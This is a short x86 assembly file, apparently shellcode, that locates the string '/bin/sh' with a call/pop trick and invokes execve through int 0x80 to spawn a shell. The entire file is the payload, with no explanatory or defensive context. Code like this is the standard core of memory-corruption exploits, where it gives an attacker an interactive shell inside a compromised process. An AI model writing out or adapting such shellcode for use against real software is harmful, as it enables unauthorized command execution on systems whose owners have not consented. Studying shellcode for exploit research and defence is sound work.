; shellcode.asm
BITS 32
global _start
 
_start:
    call syscall
    db '/bin/sh',0

syscall:
    pop ebx
    mov eax, 11
    mov ecx, 0
    mov edx, 0
    int 0x80
